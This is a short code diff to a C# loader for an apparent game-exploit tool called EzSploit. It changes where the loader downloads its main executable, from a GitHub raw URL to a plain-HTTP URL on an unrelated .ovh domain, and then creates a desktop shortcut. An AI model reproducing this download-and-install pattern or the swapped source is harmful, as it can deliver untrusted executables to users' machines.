@@ -54,7 +54,7 @@ namespace EzSploit_Loader_V2
                 Directory.Delete(@"c:\mikusdevPrograms\ezsploit\Configs", true);
             }
             textlabel.Content = ("Downloading Main .exe");
-            webClient.DownloadFile("https://raw.githubusercontent.com/mikusgszyp/ezsploitfiledownloader/main/EzSploitV4.exe", @"c:\mikusdevPrograms\ezsploit\EzSploitV4.exe");
+            webClient.DownloadFile("http://dziecizautyzmem.ovh/EzSploit/EzSploitV4.exe", @"c:\mikusdevPrograms\ezsploit\EzSploitV4.exe");
             await Task.Delay(1000);
             textlabel.Content = ("Creating Desktop shortcut...");
             object shDesktop = (object)"Desktop";
